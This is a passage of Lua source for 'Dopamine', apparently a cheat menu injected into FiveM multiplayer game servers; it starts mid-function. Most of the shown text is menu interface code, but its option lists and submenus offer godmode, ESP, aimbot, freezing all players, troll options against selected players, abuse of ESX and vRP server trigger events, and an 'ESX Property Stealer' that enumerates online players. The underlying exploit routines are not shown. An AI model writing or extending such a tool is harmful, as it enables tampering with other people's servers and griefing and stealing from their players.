				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Dopamine.MenuButton(text, id, subText, spriteData)
	if menus[id] then
		if Dopamine.Button2(text, subText, spriteData) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint('Failed to create '..tostring(text)..' menu button: '..tostring(id)..' submenu doesn\'t exist')
	end

	return false
end

function Dopamine.CheckBox(text, checked, callback)
	--[[if Dopamine.Button(text, checked and '~g~Enabled' or '~r~Disabled') then]]
	if Dopamine.CheckboxButton(text, checked) then
		checked = not checked
		debugPrint(tostring(text)..' checkbox changed to '..tostring(checked))
		if callback then callback(checked) end

		return true
	end

	return false
end

function Dopamine.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = comboArrowL..tostring(selectedItem)..comboArrowR
	end

	if Dopamine.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function Dopamine.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if Dopamine.Button3(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end

local function drawButton3(text, items, itemsCount, currentIndex)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local rectBackgroundColor = nil
		local rectBackgroundLine = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
			rectBackgroundColor = { r = MainColor.r, g = MainColor.g, b = MainColor.b, a = 255 }
			rectBackgroundLine = { r = MainColor.r, g = MainColor.g, b = MainColor.b, a = 255 }
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			rectBackgroundColor = menus[currentMenu].menuTextColor
			rectBackgroundLine = {r = 155, g = 155, b = 155, a = 150}
			shadow = true
		end

        local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.16
        local stabilizer = 1

        --[[ Draw order from top to bottom]]
        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) --[[ Button Rectangle -2.15]]
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1) + 0.001, buttonHeight / 2 + 0.002, rectBackgroundLine)
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 10, g = 10, b = 10, a = 150})
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, rectBackgroundColor)
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1650
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1625
        elseif string.len(CurrentItem) == 3 then XOffset = 0.16015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1585
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1570
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1555
		end
		
        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow) --[[ Current Item Text]]
	
		if menus[currentMenu].currentOption == optionCount and menu_RectOverlay then
			if not HasStreamedTextureDictLoaded('deadline') then RequestStreamedTextureDict('deadline', true) end
			DrawSprite('deadline', 'deadline_trail_01', x, y, menus[currentMenu].width, buttonHeight, 0.0, MainColor.r, MainColor.g, MainColor.b, 55)
		end
	end
end

function Dopamine.Button3(text, items, itemsCount, currentIndex)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton3(text, items, itemsCount, currentIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Dopamine.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			Dopamine.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustReleased(1, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustReleased(1, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustReleased(1, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustReleased(1, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustReleased(1, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustReleased(1, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					Dopamine.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function Dopamine.SetMenuWidth(id, width)
	setMenuProperty(id, 'width', width)
end

function Dopamine.SetMenuX(id, x)
	setMenuProperty(id, 'x', x)
end

function Dopamine.SetMenuY(id, y)
	setMenuProperty(id, 'y', y)
end

function Dopamine.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, 'maxOptionCount', count)
end

function Dopamine.SetTitle(id, title)
	setMenuProperty(id, 'title', title)
end

function Dopamine.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a })
end

function Dopamine.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a })
end

function Dopamine.SetTitleBackgroundSprite(id, textureDict, textureName)
	RequestStreamedTextureDict(textureDict)
	setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
end

function Dopamine.SetTitleBackgroundSpriteNil(id)
	setMenuProperty(id, 'titleBackgroundSprite', nil)
end

function Dopamine.SetSubTitle(id, text)
	setMenuProperty(id, 'subTitle', text)
end

function Dopamine.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
end
function Dopamine.SetMenuSubTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, 'subTitleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].subTitleBackgroundColor.a })
end

function Dopamine.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a })
end

function Dopamine.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a })
end

function Dopamine.SetMenuFocusTextColor(id, r, g, b, a)
	setMenuProperty(id, 'menuFocusTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusTextColor.a })
end

function Dopamine.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a })
end

function Dopamine.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, 'buttonPressedSound', { ['name'] = name, ['set'] = set })
end

function Dopamine.SetFont(id, font)
	buttonFont = font
	menus[id].titleFont = font
end

function Dopamine.SetMaxOptionCount(id, count)
	setMenuProperty(id, 'maxOptionCount', count)
end

function Dopamine.SetMenuFocusBackgroundColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
end

local selectedTheme = 'dark'
local availableThemes = {'dark', 'light'}
local rainbowInt = 0
Citizen.CreateThread(function()
	while ShouldShowMenu do Citizen.Wait(0)
		rainbowInt = ReturnRGB(1.0)
		if selectedThemeRainbow then
			MainColor = {
				r = rainbowInt.r, 
				g = rainbowInt.g, 
				b = rainbowInt.b,
				a = 255
			}
		end
	end
end)

function Dopamine.SetTheme(id)
	if selectedTheme == 'light' then
		MainColor = {
			r = 89, 
			g = 173, 
			b = 218,
			a = 255
		}
		Dopamine.SetTitleBackgroundSprite(id, 'commonmenu', 'interaction_bgd')
		Dopamine.SetMenuBackgroundColor(id, 45, 45, 45, 225)
		Dopamine.SetMenuFocusBackgroundColor(id, 25, 25, 25, 225)
		Dopamine.SetMenuSubTitleBackgroundColor(id, 0, 0, 0, 255)
		Dopamine.SetTitleBackgroundColor(id, MainColor.r, MainColor.g, MainColor.b, 255)
		Dopamine.SetTitleColor(id, 255, 255, 255, 255)
		Dopamine.SetMenuTextColor(id, 150, 150, 150)
		Dopamine.SetMenuFocusTextColor(id, 175, 175, 175, 255)
		Dopamine.SetMenuSubTextColor(id, 155, 155, 155, 225)
		Dopamine.SetFont(id, 4)
		Dopamine.SetMenuX(id, 0.025)
		Dopamine.SetMenuY(id, 0.3)
		Dopamine.SetMenuWidth(id, 0.25)
		Dopamine.SetMaxOptionCount(id, 12)
		
		titleHeight = 0.0525
		titleXOffset = 0.15
		titleYOffset = 0.00485
		titleScale = 0.7
		titleSpacing = 2.0
		buttonHeight = 0.035
		buttonScale = 0.360
		buttonTextXOffset = 0.003
		buttonTextYOffset = 0.0025

		comboArrowR = ' »'
		comboArrowL = '« '
	elseif selectedTheme == 'dark' then
		MainColor = {
			r = 225, 
			g = 55, 
			b = 55,
			a = 255
		}
		Dopamine.SetTitleBackgroundSprite(id, 'shopui_title_sm_hangar', 'shopui_title_sm_hangar')
		--[[Dopamine.SetTitleBackgroundSpriteNil(id)]]
		Dopamine.SetMenuBackgroundColor(id, 25, 25, 25, 225)
		Dopamine.SetMenuFocusBackgroundColor(id, 50, 50, 50, 230)
		Dopamine.SetMenuSubTitleBackgroundColor(id, 35, 35, 35, 255)
		Dopamine.SetTitleBackgroundColor(id, 15, 15, 15, 255)
		Dopamine.SetTitleColor(id, 135, 135, 135, 255)
		Dopamine.SetMenuTextColor(id, 150, 150, 150)
		Dopamine.SetMenuFocusTextColor(id, 155, 155, 155, 255)
		Dopamine.SetMenuSubTextColor(id, 70, 70, 70, 255)
		Dopamine.SetFont(id, 4)
		Dopamine.SetMenuX(id, 0.025)
		Dopamine.SetMenuY(id, 0.3)
		Dopamine.SetMenuWidth(id, 0.25)
		Dopamine.SetMaxOptionCount(id, 12)
		
		titleHeight = 0.0525
		titleXOffset = 0.15
		titleYOffset = 0.00485
		titleScale = 0.7
		titleSpacing = 2.0
		buttonHeight = 0.035
		buttonScale = 0.360
		buttonTextXOffset = 0.003
		buttonTextYOffset = 0.0025

		comboArrowR = ' »'
		comboArrowL = '« '
	end
end

function Dopamine.InitializeTheme()
	for i = 1, #menus_list do
		Dopamine.SetTheme(menus_list[i], selectedTheme)
	end
end

--[[
	Notifications system
]]

cachedNotifications = {}

Dopamine.AddNotification = function(text, ms)
    table.insert(cachedNotifications, { ["text"] = text, ["time"] = ms, ["startTime"] = GetGameTimer() })
end

Dopamine.RemoveNotification = function(id)
    table.remove(cachedNotifications, id)
end

Dopamine.Draw3D = function(x, y, text, opacity)
    if opacity > 255 then
        opacity = 255
    elseif opacity < 0 then
        opacity = 0
    end

	SetTextScale(0.35, 0.35)
	if menu_TextDropShadow then
		SetTextDropShadow(0, 0, 0, 0,255)
	end
	SetTextEdge(2, 0, 0, 0, 255)
	if menu_TextOutline then
		SetTextOutline()
	end
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, math.floor(opacity))
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(x, y)
    
    local factor = string.len(text) / 300
    
    DrawRect(x, y + 0.0135, 0.0155 + factor, 0.03, 25, 25, 25, opacity)
    DrawRect(x, y + 0.0125, 0.015 + factor, 0.03, MainColor.r, MainColor.g, MainColor.b, opacity)
end

Dopamine.PushNotification = function(text, ms)
	if text then
		if not ms then ms = 5000 end
        Dopamine.AddNotification(text, ms)
    end
end

Dopamine.PushNotification('Dopamine injected successfully', 5000)
Dopamine.PushNotification('www.d0pamine.xyz', 10000)

--[[
	Add variables here for magic.
]]

local selfInfiniteStamina = false
local selfGodmode = false
local selfSemigodmode = false
local selfNeverWanted = false
local selfSuperJump = false
local isSpectatingTarget = false
local spectatedPlayer = nil
local vehiclesGodmode = false
local vehicleOptions2Step = false
local vehiclesRainbow = false
local vehiclesLower = false
local vehiclesWallride = false
local vehiclesSpawnUpgraded = false
local vehiclesSpawnInside = true
local vehiclesAlwaysWheelie = false
local vehiclesDriftSmoke = false
local weaponsDamageMultiplierCurrent = 1
local weaponsDamageMultiplierSelected = 1
local weaponsDamageMultiplierSet = 1
local visualsBlackout = false
local visualsESPEnable = false
local visualsESPShowSelf = false
local visualsESPShowLine = false
local visualsESPShowBox = false
local visualsESPShowID = false
local visualsESPShowName = false
local visualsESPShowDistance = false
local visualsESPShowWeapon = false
local visualsESPShowVehicle = false
local visualsESPRefreshRate = 0
local visualsESPRefreshRates = {"0ms", "50ms", "150ms", "250ms", "500ms", "1s", "2s", "5s"}
local visualsESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0}
local visualsESPDistance = 500.0
local currentVisualsESPDistance = 1
local selectedVisualsESPDistance = 1
local currentESPRefreshIndex = 1
local selectedESPRefreshIndex = 1
local teleportShowCoords = false
local currentTeleportToOptions = 1
local selectedTeleportToOptions = 1
local allPlayersFreeze = false
local allPlayersDisableDrivingCars = false
local allPlayersNoisyVehicles = false
local weaponsExplosiveAmmo = false
local weaponsTeleportGun = false
local weaponsAimbotT = false
local weaponsRapidFire = false
local allPlayersIncludeSelf = true

local currentCustomCrosshair = 1
local selectedCustomCrosshair = 1
customCrosshairOpts = {
    "Off",
    "Default",
    "Custom"
}

Jobs = {
    "Unemployed",
    "Mechanic",
    "Police",
    "Ambulance",
    "Taxi",
    "Real Estate Agent",
    "Car Dealer",
    "Banker",
    "Gang",
    "Mafia",
}
Jobs.Item = {
    "Butcher", "Tailor", "Miner", "Fueler", "Lumberjack", "Fisher", "Hunting", "Weed", "Meth", "Coke", "Opium"
}
Jobs.ItemDatabase = {
    ["Butcher"]         = oTable.new{ "Alive Chicken", "alive_chicken", "Slaughtered Chicken", "slaughtered_chicken", "Packaged Chicken", "packaged_chicken" },
    ["Tailor"]          = oTable.new{ "Wool", "wool", "Fabric", "fabric", "Clothes", "clothe" },
    ["Fueler"]          = oTable.new{ "Petrol", "petrol", "Refined Petrol", "petrol_raffin", "Essence", "essence" },
    ["Miner"]           = oTable.new{ "Stone", "stone", "Washed Stone", "washed_stone", "Diamond", "diamond" },
    ["Lumberjack"]      = oTable.new{ "Wood", "wood", "Cutted Wood", "cutted_wood", "Packed Plank", "packaged_plank" },
    ["Fisher"]          = oTable.new{ "Fish", "fish" },
	["Hunting"]         = oTable.new{ "Meat", "meat"},
	["Coke"]            = oTable.new{ "Coke", "coke", "Coke Bag", "coke_pooch" },
    ["Weed"]            = oTable.new{ "Weed", "weed", "Weed Bag", "weed_pooch" },
    ["Meth"]            = oTable.new{ "Meth", "meth", "Meth Bag", "meth_pooch" },
    ["Opium"]           = oTable.new{ "Opium", "opium", "Opium Bag", "opium_pooch" },
}
Jobs.ItemRequires = {
    ["Fabric"]          = "Wool",
    ["Clothes"]         = "Fabric",
    ["Washed Stone"]    = "Stone",
	["Diamond"]         = "Washed Stone",
	["Coke Bag"]        = "coke",
    ["Weed Bag"]        = "weed",
    ["Meth Bag"]        = "meth",
    ["Opium Bag"]       = "opium"
}

local currentESXItemSpawn = 1
local selectedESXItemSpawn = 1
local currentESXDrugSpawn = 1
local selectedESXDrugSpawn = 1

--[[
	Menu settings.
]]

local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 4
local selectedMenuY = 4
local menuX = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
local menuY = { 0.025, 0.1, 0.2, 0.3, 0.425 }

TesticleFunction = function()

end

local TesticleTest = false

Citizen.CreateThread(function()
	--[[themes]]
	local currentThemeIndex = 1
    local selectedThemeIndex = 1

	--[[selfOptions]]
	local FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
	local FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}
	local currentFastRunIndex = 1
    local selectedFastRunIndex = 1
    local currentFastSwimIndex = 1
	local selectedFastSwimIndex = 1

	--[[allPlayersOptions]]
	local pedDensityX = {1.0, 0.8, 0.6, 0.4, 0.2, 0.1, 0.0}
	local pedDensityXCurrent = 1
    local pedDensityXSelectedf = 1
	local pedDensityXWords = {'Default', '-20%', '-40%', '-60%', '-80%', '-100%'}
	local pedDensityXSelected = 1
	local aPOPropOptionsCurrent = 1
	local aPOPropOptionsSelected = 1

	--[[selectedPlayerOptions]]
	local sPORamVehicleCurrent = 1
	local sPORamVehicleSelected = 1
	local sPORamVehicleX = 'bus'
	local sPORamVehicleWords = {'bus', 'monster', 'freight', 'bulldozer'}
	local sPOPropOptionsCurrent = 1
	local sPOPropOptionsSelected = 1

	--[[vehicleOptions]]
	local vehiclesMultiplierX = {1.0, 2.0, 4.0, 8.0, 16.0, 32.0, 64.0, 128.0, 256.0, 512.0}
	local vehiclesMultiplierXWords = {'+1%', '+2%', '+4%', '+8%', '+16%', '+32%', '+64%', '+128%', '+256%', '+512%'}
	local vehiclesEnginePowerBoostCurrent = 1
    local vehiclesEnginePowerBoostSelected = 1
	local enginePowerBoost = 1
	local vehiclesEngineTorqueBoostCurrent = 1
	local vehiclesEngineTorqueBoostSelected = 1
	local engineTorqueBoost = 1
	local vehiclesCustomSoundCurrent = 1
	local vehiclesCustomSoundSelected = 1
	local vehiclesCustomSound = 1
	local vehiclesCustomSounds = {'jester3', 'elegy', 'sultanrs', 'coquette3', 'monster', 'banshee2', 'specter'}
	
	--[[weaponOptions]]
	local weaponsDamageMultiplier = {1.0, 2.0, 3.0, 5.0, 10.0, 25.0, 50.0, 250.0, 1000.0}
	local weaponOptionsSelected = nil
	local weaponOptionsSelectedWeapon = nil
	local weaponOptionsSelectedMod = nil

	--[[keybindSettings]]
	local currentKeybindMenu = 37

	Dopamine.CreateMenu('dopamine', 'Dopamine')
	Dopamine.SetSubTitle('dopamine', 'd0pamine v1.1 by Nertigel')
	Dopamine.CreateSubMenu('selfOptions', 'dopamine', 'Self Options')
	Dopamine.CreateSubMenu('onlinePlayersOptions', 'dopamine', 'Online Players')
	Dopamine.CreateSubMenu('visualOptions', 'dopamine', 'Visual Options')
	Dopamine.CreateSubMenu('teleportOptions', 'dopamine', 'Teleport Options')
	Dopamine.CreateSubMenu('vehicleOptions', 'dopamine', 'Vehicle Options')
	Dopamine.CreateSubMenu('weaponOptions', 'dopamine', 'Weapon Options')
	Dopamine.CreateSubMenu('serverOptions', 'dopamine', 'Server Options')
	Dopamine.CreateSubMenu('menuSettings', 'dopamine', 'Menu Options')
	
	Dopamine.CreateSubMenu('selfSuperPowers', 'selfOptions', 'Super Powers')

	Dopamine.CreateSubMenu('allPlayersOptions', 'onlinePlayersOptions', 'All Online Players')
	Dopamine.CreateSubMenu('selectedPlayerOptions', 'onlinePlayersOptions', 'Selected Player Options')
	Dopamine.CreateSubMenu('selectedPlayerOptionsTriggers', 'selectedPlayerOptions', 'Selected Player Trigger Options')
	Dopamine.CreateSubMenu('selectedPlayerOptionsTroll', 'selectedPlayerOptions', 'Selected Player Troll Options')

	Dopamine.CreateSubMenu('visualOptionsESP', 'visualOptions', 'Visual ESP Options')

	Dopamine.CreateSubMenu('vehicleLosSantosCustoms', 'vehicleOptions', 'Los Santos Customs')
	Dopamine.CreateSubMenu('vehicleLosSantosCustomsCosmetics', 'vehicleLosSantosCustoms', 'Los Santos Customs | Cosmetics')
	Dopamine.CreateSubMenu('vehicleLosSantosCustomsPerformance', 'vehicleLosSantosCustoms', 'Los Santos Customs | Performance')
	Dopamine.CreateSubMenu('vehicleSpawnList', 'vehicleOptions', 'Vehicle Spawn Options')
	Dopamine.CreateSubMenu('vehicleSpawnSelected', 'vehicleSpawnList', 'Select A Vehicle')
	Dopamine.CreateSubMenu('vehicleSpawnSelectedOptions', 'vehicleSpawnSelected', 'Vehicle Spawn Selected')

	Dopamine.CreateSubMenu('weaponOptionsTypes', 'weaponOptions', 'Weapon Type Selection')
	Dopamine.CreateSubMenu('weaponOptionsTypeSelection', 'weaponOptionsTypes', 'Weapon Selection')
	Dopamine.CreateSubMenu('weaponModOptionsOptions', 'weaponOptionsTypeSelection', 'Weapon Options')
	Dopamine.CreateSubMenu('weaponsModSelect', 'weaponModOptionsOptions', 'Weapon Mod Options')

	Dopamine.CreateSubMenu('serverOptionsResources', 'serverOptions', 'Server Resources')
	Dopamine.CreateSubMenu('serverOptionsTriggerEvents', 'serverOptions', 'Trigger Events')
	Dopamine.CreateSubMenu('serverOptionsTriggerEventsESX', 'serverOptionsTriggerEvents', 'ESX Trigger Events')
	Dopamine.CreateSubMenu('serverOptionsTriggerEventsVRP', 'serverOptionsTriggerEvents', 'vRP Trigger Events')
	Dopamine.CreateSubMenu('serverOptionsTriggerEventsESXProperty', 'serverOptionsTriggerEventsESX', 'ESX Property Stealer')

	if ESX ~= nil then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)
			for i = 1, #players do
				Dopamine.CreateSubMenu("esx_property"..players[i].source, 'serverOptionsTriggerEventsESXProperty', 'ESX Property Stealer')
			end
		end)
	end

	Dopamine.CreateSubMenu('credits', 'menuSettings', 'Menu Credits')
	Dopamine.CreateSubMenu('keybindSettings', 'menuSettings', 'Keybind Settings')

	Dopamine.InitializeTheme(1)

	local introInteger = 0
	while ShouldShowMenu do

		if introInteger == 0 then
			introScaleform = InitializeIntro("mp_big_message_freemode", "~r~d0pamine | Press TAB")
			DrawScaleformMovieFullscreen(introScaleform, 80, 80, 80, 80, 0)
			Citizen.CreateThread(function()
				while ShouldShowMenu do
					Wait(2000)
					introInteger = introInteger + 1
				end
			end)
		elseif introInteger == 300 then
		end

		if Dopamine.IsMenuOpened('dopamine') then
			if Dopamine.MenuButton('Self Options', 'selfOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_deaths_icon', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.MenuButton('Online Players', 'onlinePlayersOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_friends_icon', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.MenuButton('Visual Options', 'visualOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_bikers_icon', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.MenuButton('Teleport Options', 'teleportOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_star_icon', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.MenuButton('Vehicle Options', 'vehicleOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_steeringwheel_icon', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.MenuButton('Weapon Options', 'weaponOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_kd_icon', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.MenuButton('Server Options', 'serverOptions', '', {dict = 'mpleaderboard', text = 'leaderboard_globe_icon', color = {r=255, g=255, b=255}}) then
			elseif Dopamine.MenuButton('Menu Options', 'menuSettings', '', {dict = 'mpleaderboard', text = 'leaderboard_position_icon', color = {r=255, g=255, b=255}}) then
			
			elseif Dopamine.Button('Testicle') then
				TesticleFunction()
			elseif Dopamine.CheckBox('TESTICLE', TesticleTest) then
				TesticleTest = not TesticleTest
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('selfOptions') then
			if Dopamine.MenuButton('Super Powers', 'selfSuperPowers') then
			elseif Dopamine.CheckBox('Godmode', selfGodmode) then
				selfGodmode = not selfGodmode
			elseif Dopamine.CheckBox('Semi Godmode', selfSemigodmode) then
				selfSemigodmode = not selfSemigodmode
			elseif Dopamine.CheckBox('Infinite Stamina', selfInfiniteStamina) then
				selfInfiniteStamina = not selfInfiniteStamina
			elseif Dopamine.CheckBox('Never Wanted', selfNeverWanted) then
				selfNeverWanted = not selfNeverWanted
			elseif Dopamine.Button('Suicide', 'Native') then
				SetEntityHealth(PlayerPedId(-1), 0)
			elseif Dopamine.Button('Refill Health', 'Native') then
				SetEntityHealth(PlayerPedId(-1), 200)
				Dopamine.PushNotification('Health refilled', 5000)
			elseif Dopamine.Button('Refill Armour', 'Native') then
				SetPedArmour(PlayerPedId(-1), 200)
				Dopamine.PushNotification('Armour refilled', 5000)
			elseif Dopamine.Button('Refill Stamina', 'Native') then
				ResetPlayerStamina(PlayerPedId(-1))
			elseif Dopamine.Button('Revive', 'Native') then
				NertigelFunc.nativeRevive()
			elseif Dopamine.Button('Clear Wanted Levels', 'Native') then
				NertigelFunc.clearSelfWanted()
			elseif Dopamine.Button('Disappear From Chase', 'Native') then
				NertigelFunc.disappearFromChase()
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('selfSuperPowers') then
			if Dopamine.CheckBox('Super Jump', selfSuperJump) then
				selfSuperJump = not selfSuperJump
			elseif Dopamine.ComboBoxSlider("Fast Run", FastCBWords, currentFastRunIndex, selectedFastRunIndex, 
				function(currentIndex, selectedIndex)
					currentFastRunIndex = currentIndex
					selectedFastRunIndex = currentIndex
					FastRunMultiplier = FastCB[currentIndex]
					SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
				end) then
			elseif Dopamine.ComboBoxSlider("Fast Swim", FastCBWords, currentFastSwimIndex, selectedFastSwimIndex, 
				function(currentIndex, selectedIndex)
					currentFastSwimIndex = currentIndex
					selectedFastSwimIndex = currentIndex
					FastSwimMultiplier = FastCB[currentIndex]
					SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
				end) then
			end

			Dopamine.Display()
		elseif Dopamine.IsMenuOpened('onlinePlayersOptions') then
			Dopamine.SetSubTitle('onlinePlayersOptions', #GetActivePlayers()..' Player(s) Online')
			if Dopamine.MenuButton('All Players / World', 'allPlayersOptions') then
			else
				local playerlist = GetActivePlayers()
				for i = 1, #playerlist do
					local currentPlayer = playerlist[i]
					
